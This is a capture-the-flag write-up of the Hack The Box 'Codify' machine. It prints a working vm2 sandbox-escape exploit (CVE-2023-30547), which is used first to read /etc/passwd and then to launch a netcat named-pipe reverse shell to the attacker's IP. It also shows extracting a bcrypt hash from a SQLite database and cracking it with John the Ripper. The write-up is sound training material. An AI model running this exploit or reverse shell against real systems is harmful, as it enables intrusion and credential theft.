---
title: Hack The Box - Codify
date: 2024-08-08 13:33:37 +0200
categories:
  - HackTheBox
tags:
  - HTB
comments: true
---

HTB Codify Machine - https://www.hackthebox.com/machines/codify

### Scanning & Enumeration
Scan and enumerate the machine for open ports and services running on it:
```
nmap -sC -sV -v -oN nmap.log 10.10.11.239
```

![](/assets/img/posts/Pasted image 20260820103802.png)

I added the IP address to `/etc/hosts`:
```
echo "10.10.11.239 codify.htb" | sudo tee -a /etc/hosts
```

I started off by browsing to `codify.htb` with Burp Suite enabled to intercept traffic. Exploring the web application revealed 3 main pages:
- About Us - This page explained that Codify is a Node.js sandbox environment using the vm2 library to execute untrusted code safely.
- Editor - A simple page with a textarea to enter Node.js code and execute it.
- Limitations - Notes restrictions like blocked access to certain modules like child_process and fs.

![](/assets/img/posts/Pasted image 20260820104004.png)

It says it is using the **vm2 library** to run JavaScript code in a sandbox environment.

### Exploitation & Gaining Access
After looking for current vulnerabilities in the vm2 library, I found a recently disclosed sandbox escape vulnerability CVE-2023-30547:
https://github.com/advisories/GHSA-ch3r-j5x3-6q2m
https://www.uptycs.com/blog/threat-research-report-team/exploitable-vm2-vulnerabilities
https://www.bleepingcomputer.com/news/security/new-sandbox-escape-poc-exploit-available-for-vm2-library-patch-now/
https://gist.github.com/leesh3288/381b230b04936dd4d74aaf90cc8bb244
which allows an attacker to bypass sandbox limitations and execute arbitrary code in the host environment.

I modified the PoC command and tested whether the exploit was working in the expected manner. The command I used, and got the result.
```
const {VM} = require("vm2");
const vm = new VM();
const code = `
cmd = 'cat /etc/passwd'
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync(cmd);
}
`
console.log(vm.run(code));
```

![](/assets/img/posts/Pasted image 20260820105615.png)

Now, it's time to get a reverse shell.

First, set up our netcat listener
```
nc -nvlp 9001
```

Second, making our reverse shell
```
const {VM} = require("vm2");
const vm = new VM();

const code = `
cmd = 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.16.26 9001 >/tmp/f'
err = {};
const handler = {
    getPrototypeOf(target) {
        (function stack() {
            new Error().stack;
            stack();
        })();
    }
};
  
const proxiedErr = new Proxy(err, handler);
try {
    throw proxiedErr;
} catch ({constructor: c}) {
    c.constructor('return process')().mainModule.require('child_process').execSync(cmd);
}
`
console.log(vm.run(code));
```


![](/assets/img/posts/Pasted image 20260820105222.png)

Great! now we got a shell as svc user. We have a user home directory “Joshua” but we can’t move into that directory. So, it’s time to enumerate.

### Privilege Escalation
Enumerating the file system. I noticed an interesting file named `tickets.db`.
```
cd /var/www/contact
ls -la tickets.db
```

![](/assets/img/posts/Pasted image 20260820110117.png)

It was a SQLite database file owned by the svc user, and this revealed a bcrypt password hash for the user `joshua: joshua$2a\$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2`

Crack it using John the Ripper. I first saved the hash to a file:
```
echo '$2a$12$SOn8Pf6z8fO/nVsNbAAequ/P6vLRJJl7gCUEiYBU2iLHn4G/p/Zw2' > hash.txt
```

Then I invoked John with the bcrypt format and rockyou wordlist:
```
john --format=bcrypt --wordlist=/usr/share/wordlists/rockyou.txt hash.txt
```

This successfully cracked the hash, revealing the password.

![](/assets/img/posts/Pasted image 20250817003554.png)